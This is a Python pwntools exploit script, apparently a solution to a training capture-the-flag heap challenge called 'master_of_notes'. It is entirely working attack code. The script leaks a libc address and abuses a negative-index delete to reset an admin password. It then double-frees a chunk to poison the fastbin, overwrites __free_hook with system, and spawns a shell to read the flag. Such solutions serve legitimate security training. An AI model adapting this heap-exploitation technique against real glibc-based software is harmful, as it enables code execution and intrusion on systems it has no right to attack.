from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./master_of_notes")
        gdb.attach(p, """
            # b *delete_note
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./master_of_notes"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 4004)
else:
    p = process("./master_of_notes")

def register(name, password):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Name: ')
    p.sendline(name)
    p.recvuntil(b'Password: ')
    p.sendline(password)
    n = p.recvuntil(b'users.')[:-len(' users.')]
    num_usr = int(n[-1] - ord('0'))
    n = p.recvuntil(b'notes.')[:-len(' notes.')]
    num_notes = int(n[-1] - ord('0'))
    return (num_usr, num_notes)

def login(name, password):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Name: ')
    p.sendline(name)
    p.recvuntil(b'Password: ')
    p.sendline(password)

def create_note(idx, size):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(b'%d' % (idx))
    p.recvuntil(b'Note size: ')
    p.sendline(b'%d' % (size))

def fill_note(idx, content):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(b'%d' % (idx))
    p.recvuntil(b'Content: ')
    p.send(content)

def add_note(idx, size, content):
    create_note(idx, size)
    fill_note(idx, content)

def print_note(idx):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    for i in range(idx+1):
        p.recvuntil(b']')
    p.recvuntil(b'Note: ')
    note = p.recvuntil(b'\n')[:-1]
    p.recvuntil(b'Quit')
    return note

def delete_note(idx, sel=4):
    p.recvuntil(b'> ')
    p.sendline(b'%d' % sel)
    p.recvuntil(b'Index: ')
    p.sendline(b'%d' % (idx))

def master_delete_note(idx):
    delete_note(idx, sel=2)

def logout(sel=5):
    p.recvuntil(b'> ')
    p.sendline(b'%d' % sel)

def master_logout():
    logout(sel=3)

def master_login(password):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'Password: ')
    p.sendline(password)

libc = ELF("./libc-2.27.so")
exe = ELF("./master_of_notes")

# LEAK LIBC
size = 0x50

name = b"Master of Notes\x00"
password = b"aaaa"

(u, n) = register(name, password)

login(name, password)

add_note(0, size, b'a')

offset = 0x3ebc00
leak = b'\x00' +  print_note(0)[1:] + b'\x00\x00'

print("[!] offset: %#x" % offset)
libc.address = u64(leak) - offset
print("[!] leak libc: %#x" % libc.address)

# Exploit

delete_note(-8) # notes_array[-8] points to notes_counter. This will work because the name is "Master of Notes", will reset the password

logout()

master_login(b"\x00") # We now the password ╰(◣﹏◢)╯

# The master can double free

one_gadget = 0x4f322 #  working: 0x4f322 0x10a38c, this one doesn't work: 0x4f2c5

master_delete_note(0)
master_delete_note(0) # Double free: the fastbin 0x90 will be: chunk -> chunk

master_logout()
login(name, password)

# Free Hook can be used both with system and with one_gadgets
if True:
    add_note(1, size, p64(libc.symbols["__free_hook"])) # Now the fastbin is: chunk -> free hook
    add_note(2, size, b"/bin/sh\x00") # Now the fastbin is: free hook

    add_note(3, size, p64(libc.symbols["system"])) # This chunk will be the free hook, system will be written into it
    #add_note(3, size, p64(libc.address + one_gadget)) # Also this works well :D

    delete_note(2) # Seems like free(&"/bin/sh\x00") will spawn a shell ^_^


# Malloc Hook cannot be used to spawn a shell by pointing it to system and calling malloc(*"/bin/sh\x00") because the length of the note is checked to be <0x10001, no useful address
# But we can use one_gadgets :)
if False: # NOT WORKING, the one_gadget constraints are not satisfied
    add_note(1, size, p64(libc.symbols["__malloc_hook"])) # Now the fastbin is: chunk -> malloc hook
    add_note(2, size, b"dummynotes") # Now the fastbin is: free hook

    add_note(3, size, p64(libc.address + one_gadget)) # Also this works well :D

    create_note(0, size) # the malloc Trigger the one_gadget

p.sendline(b'cat flag') # :)

p.interactive()